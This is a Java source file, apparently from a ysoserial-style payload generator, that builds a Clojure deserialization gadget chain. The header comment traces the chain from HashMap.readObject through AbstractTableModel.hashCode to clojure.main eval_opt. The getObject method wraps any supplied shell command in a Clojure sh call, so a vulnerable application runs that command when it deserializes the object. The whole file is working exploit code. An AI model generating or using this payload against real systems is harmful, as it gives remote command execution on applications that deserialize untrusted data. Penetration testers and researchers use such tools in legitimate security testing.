package com.h2tg.ysogate.payloads.gadgets;


import com.h2tg.ysogate.Strings;
import com.h2tg.ysogate.utils.PayloadRunner;
import clojure.core$comp;
import clojure.core$constantly;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import clojure.main$eval_opt;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import static com.h2tg.ysogate.annotation.Authors.JACKOFMOSTTRADES;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				AbstractTableModel$ff19274a.hashCode()
					clojure.core$comp$fn__4727.invoke()
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
 */
@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({JACKOFMOSTTRADES})
public class Clojure extends PayloadRunner implements CommandObjectPayload<Map<?, ?>>
{

	public Map<?, ?> getObject(String command) throws Exception {
		//		final String[] execArgs = command.split(" ");
//		final StringBuilder commandArgs = new StringBuilder();
//		for (String arg : execArgs) {
//			commandArgs.append("\" \"");
//			commandArgs.append(arg);
//		}
//		commandArgs.append("\"");


//		final String clojurePayload =
//				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));

		String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");

		final String clojurePayload =
		String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);

		Map<String, Object> fnMap          = new HashMap<String, Object>();
		fnMap.put("hashCode", (new core$constantly()).invoke(Integer.valueOf(0)));
		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
		model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
		HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
		targetMap.put(model, null);
		fnMap.put("hashCode", (new core$comp())
				.invoke(new main$eval_opt(), (new core$constantly())

						.invoke(clojurePayload)));
		model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
		return targetMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Clojure.class, args);
	}
}
